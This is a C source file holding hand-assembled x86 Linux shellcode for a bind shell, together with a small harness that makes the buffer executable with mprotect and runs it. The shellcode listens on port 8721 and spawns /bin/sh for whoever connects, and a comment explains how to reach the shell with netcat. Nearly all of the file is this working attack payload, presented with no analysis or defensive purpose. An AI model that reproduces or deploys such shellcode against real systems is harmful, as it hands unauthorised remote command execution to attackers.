#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>

/*
#
#   bind ip:port 0.0.0.0:0x2211
#   get shell by "nc 127.0.0.1 8721"   
#
*/

char *shellcode = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x01\x6a\x02\x89\xe1\xb3"
"\x01\xb0\x66\xcd\x80\x89\xc6\x83\xc4\x0c\x31\xd2\x52\x52\x52\x66\x68"
"\x22\x11"          								//port = 0x2211 
"\xb2\x02\x66\x52\x89\xe1\x6a\x10\x51\x56"
"\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x83\xc4\x1c\xb2\x0a\x52\x56\x89"
"\xe1\xb3\x04\xb0\x66\xcd\x80\x83\xc4\x08\x83\xec\x04\x89\xe2\x83"
"\xec\x10\x89\xe1\x52\x51\x56\x89\xe1\x31\xdb\xb3\x05\xb0\x66\xcd"
"\x80\x83\xc4\x20\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd"
"\x80\x41\xb0\x3f\xcd\x80\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80\x83\xc4\x14"
"\x31\xc0\x31\xdb\x40\xcd\x80";


int main() {

    int size = strlen(shellcode);
    printf("shellcode size = %d\n",size);
    
    void(*exploit)(void) = (void(*)(void))shellcode;
    if(-1==mprotect( (void*)((unsigned)shellcode&0xFFFFF000),size,PROT_READ|PROT_WRITE|PROT_EXEC)){
        perror("mprotect!");
        exit(-1);
    }
    exploit();

}
